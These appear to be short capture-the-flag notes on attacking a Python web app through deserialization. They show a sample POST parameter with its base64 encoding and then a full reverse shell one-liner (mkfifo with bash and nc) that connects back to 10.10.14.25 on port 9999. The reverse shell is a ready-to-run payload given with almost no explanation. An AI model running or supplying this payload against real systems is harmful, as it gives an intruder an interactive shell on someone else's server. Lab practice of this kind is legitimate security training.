# python string attack
hint: deserialization

# Foot Notes
- In Chrome, press f12 to see post/get requests sent.
# try
1. test post param:
```py
[
    {'id': 'ninja', 'left': 350, 'top': 180},
    {'id': 'pizza', 'left': 360, 'top': 190}
    
]
#WyAgICAgeydpZCc6ICduaW5qYScsICdsZWZ0JzogMzUwLCAndG9wJzogMTgwfSwgICAgIHsnaWQnOiAncGl6emEnLCAnbGVmdCc6IDM2MCwgJ3RvcCc6IDE5MH0gICAgICBd
```
2. reverse shell payload
```sh
mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.25 9999 >/tmp/f
```

